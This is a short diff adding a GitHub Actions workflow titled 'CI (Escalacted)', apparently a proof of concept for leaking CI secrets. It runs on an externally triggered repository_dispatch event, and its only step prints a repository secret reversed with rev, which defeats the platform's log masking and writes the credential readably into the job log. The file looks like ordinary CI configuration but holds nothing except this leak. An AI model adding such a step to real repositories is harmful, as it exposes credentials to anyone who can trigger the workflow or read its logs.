@@ -1,0 +1,11 @@
+name: CI (Escalacted)
+
+on:
+  repository_dispatch
+
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo ${{secrets.VERY_SECRET_KEY}} | rev
